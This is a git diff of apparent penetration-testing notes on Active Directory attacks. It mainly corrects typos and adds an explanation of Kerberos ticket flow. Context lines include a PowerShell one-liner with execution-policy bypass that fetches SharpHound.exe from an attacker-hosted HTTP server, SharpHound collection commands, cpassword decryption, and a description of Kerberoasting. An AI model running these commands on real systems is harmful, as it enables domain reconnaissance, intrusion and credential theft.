@@ -48,14 +48,14 @@ Login with username and password: neo4j
 Set a new password.
 
 cd /opt/BloodHound-v4/Collectors/
-python -m SimpleHTTPServer
+python3 -m http.server
 
 - Windows
 cd to a discrete, writable directory (C:\Users\<user>\Desktop)
 powershell -nop -exec bypass "IEX (New-Object Net.Webclient).DownloadFile('http://192.168.1.5:8000/SharpHound.exe', 'SharpHound.exe')"
 
 SharpHound.exe -c LoggedOn                        Run the following as a user that has admin rights
-SharpHound.exe -c Session                         On subseqequent runs just collect session data
+SharpHound.exe -c Session                         On subsequent runs just collect session data
 
 This will generate a zip file
 Upload the file to Kali
@@ -107,18 +107,24 @@ Search xml files for cpassword.
 GetDecryptedCpassword 'AES 256-bit encrypted password'
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Key terms
-
 - Kerberos
 The default authentication mechanism in Active Directory. It uses ticket-based authentication. A Key Distribution Center (KDC) grants a
-Ticket-Granting Ticket (TGT) to a user who requests access to a service or an account. This ticket can be redeemed to generate a service ticket (ST)
+Ticket Granting Ticket (TGT) to a user who requests access to a service or an account. This ticket can be redeemed to generate a service ticket (ST)
 to access a particular service.
+
+A user starts the communication process for a service request to a server with the service they want to access.
+Every DC runs a Kerberos Distribution Center (KDC) service that processes all requests for Kerberos tickets.
+The KBRTGT account acts as a service account for the KDC.
+It contains three parts: Database, Authentication Server (AS), and Ticket Granting Server (TGS).
+The AS verifies client authentication. If the logged user is authenticated successfully the AS issues a ticket called TGT.
+Ticket Granting Ticket (TGT) confirms to other servers that user has been authenticated.
+Ticket Granting Server (TGS): User request for TGS from the KDC that will be used to access the service of the application server.
 
 - Ticket Granting Server (TGS)
 
 - Service Principal Name (SPN)
 A unique name for a service account that is used by Kerberos to associate a service instance with service logon account. This allows a client
-application to request that the service authticate an account even if the client does not have the account name.
+application to request that the service authenticate an account even if the client does not have the account name.
 
 - Kerberoasting
 Request the TGS ticket, which has the password hash of the SPN account, then crack it offline.
